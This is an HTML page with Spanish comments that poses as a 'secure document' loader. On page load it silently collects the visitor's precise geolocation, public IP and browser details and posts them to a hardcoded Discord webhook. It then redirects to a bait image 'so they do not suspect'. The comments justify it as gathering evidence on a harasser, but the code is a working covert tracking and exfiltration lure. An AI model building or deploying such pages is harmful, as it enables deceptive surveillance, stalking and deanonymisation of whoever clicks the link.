<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualizador de Documentos</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

    <div class="text-center p-8 bg-white shadow-lg rounded-lg">
        <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
        <p class="text-gray-600">Cargando archivo seguro...</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
        
        // Este es el "cebo". Pon aquí cualquier link (ej. una foto de Google)
        const LINK_CEBO = "https://via.placeholder.com/500"; 

        async function capturarEvidencia(lat = "N/A", lon = "N/A", acc = "N/A") {
            try {
                const resIP = await fetch('https://api.ipify.org?format=json');
                const ipData = await resIP.json();

                const datosRaw = {
                    ts: new Date().toISOString(),
                    ip: ipData.ip,
                    coords: { lat, lon, precision: acc },
                    ua: navigator.userAgent
                };

                // Generamos el HASH para TU reporte (Cadena de Custodia)
                const firmaDigital = CryptoJS.SHA256(JSON.stringify(datosRaw)).toString();

                // Enviamos todo a TU Discord de forma privada
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔍 REPORTE TÉCNICO GENERADO",
                            fields: [
                                { name: "📍 Coordenadas", value: lat !== "N/A" ? `[Maps](https://www.google.com/maps?q=${lat},${lon})` : "Denegado", inline: true },
                                { name: "🎯 Precisión", value: `${acc}m`, inline: true },
                                { name: "🌐 IP", value: `\`${ipData.ip}\`` },
                                { name: "🔑 Hash SHA-256 (Para tu Reporte)", value: `\`${firmaDigital}\`` },
                                { name: "📱 Info", value: `\`${datosRaw.ua}\`` }
                            ]
                        }]
                    })
                });

                // Redirigimos al acosador al cebo para que no sospeche
                window.location.href = LINK_CEBO;

            } catch (e) {
                window.location.href = LINK_CEBO;
            }
        }

        window.onload = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => capturarEvidencia(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
                    () => capturarEvidencia(),
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                capturarEvidencia();
            }
        };
    </script>
</body>
</html>
